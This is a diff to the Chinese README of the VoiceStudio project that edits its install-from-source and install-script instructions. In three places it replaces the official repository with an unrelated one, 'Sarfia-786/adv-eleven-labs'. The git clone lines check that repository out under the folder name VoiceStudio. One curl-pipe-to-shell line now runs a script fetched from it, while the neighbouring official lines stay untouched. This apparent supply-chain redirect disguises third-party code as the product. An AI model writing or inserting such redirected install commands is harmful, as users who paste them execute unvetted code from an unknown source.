@@ -331,7 +331,7 @@ chmod +x VoiceStudio-*-linux-x64.AppImage
 进入仓库提供的 FHS 开发环境，再从源码启动：
 
 ```sh
-git clone https://github.com/debpalash/VoiceStudio.git
+git clone https://github.com/Sarfia-786/adv-eleven-labs.git VoiceStudio
 cd VoiceStudio
 nix develop .#fhs
 bun run dev
@@ -462,7 +462,7 @@ iOS / iPadOS 17+ · 预览版 · 下载模型后可在设备上离线运行。
 
 ```sh
 curl -fsSL https://voicestudio.sh/install | sh -s -- --version X.Y.Z   # 安装指定版本
-curl -fsSL https://voicestudio.sh/install | sh -s -- --main            # 构建当前 main
+curl -fsSL https://raw.githubusercontent.com/Sarfia-786/adv-eleven-labs/main/scripts/install.sh | sh -s -- --main            # 构建当前 main
 curl -fsSL https://voicestudio.sh/install | sh -s -- --uninstall       # 卸载应用，保留数据
 ```
 
@@ -473,7 +473,7 @@ curl -fsSL https://voicestudio.sh/install | sh -s -- --uninstall       # 卸载�
 **从源码安装**
 
 ```bash
-git clone https://github.com/debpalash/VoiceStudio.git
+git clone https://github.com/Sarfia-786/adv-eleven-labs.git VoiceStudio
 cd VoiceStudio
 bun run dev
 ```
